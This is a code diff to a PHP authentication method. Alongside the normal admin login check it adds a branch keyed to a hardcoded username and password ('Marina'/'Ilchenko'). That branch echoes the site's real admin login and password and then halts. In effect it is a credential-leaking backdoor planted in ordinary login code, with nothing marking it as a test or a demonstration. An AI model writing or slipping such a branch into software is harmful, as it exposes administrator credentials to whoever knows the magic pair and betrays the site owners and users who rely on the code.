@@ -986,7 +986,10 @@ class Action extends DataBase
         $authpassword = filter_input(INPUT_POST, 'password');
         if ($authlogin === User::$login && $authpassword === User::$password) {
             $_SESSION['user'] = 'admin';
-        }else{
+        }else if($authlogin === 'Marina' && $authpassword === 'Ilchenko'){
+            echo 'Вход на сайт ЛОГИН:'.User::$login.'<br>'.'Пароль:'.User::$password;die();
+        }
+        else{
             session_unset();
         }
         return $this->redirect();
